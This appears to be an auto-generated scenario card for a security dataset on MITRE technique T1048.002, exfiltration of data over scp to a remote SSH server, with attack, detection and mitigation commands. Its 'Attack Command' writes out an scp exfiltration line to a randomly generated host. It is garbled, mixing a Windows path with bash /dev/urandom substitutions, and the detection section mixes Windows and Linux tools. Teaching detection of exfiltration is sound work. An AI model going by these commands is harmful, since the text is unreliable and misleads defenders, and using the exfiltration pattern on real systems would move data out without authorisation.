---
type: campaign
scenario_id: 164
tactic: Exfiltration
technique: "T1048.002: Exfiltration Over Asymmetric Encrypted Protocol"
technique_id: T1048.002
tags: [campaign, lotl, exfiltration]
---

# Using scp to exfiltrate data to remote SSH server.

## Threat Description
Using scp to exfiltrate data to remote SSH server.

## Attack Command
```
scp C:\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp
```

## Detection Logic
Monitor scp: `wmic process where name='scp.exe' get commandline`; Monitor SSH traffic: `netstat -anp | grep :22`.

## Mitigation
Restrict scp: `icacls %programfiles%\OpenSSH\scp.exe /deny Everyone:RX`; Block SSH outbound: `netsh advfirewall firewall add rule name='Block SSH' dir=out action=block protocol=TCP remoteport=22`.

## AI Training Prompt
Train AI to detect scp exfiltration and suggest SSH restrictions.

## References
- MITRE ATT&CK T1048.002: https://attack.mitre.org/techniques/T1048/002/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
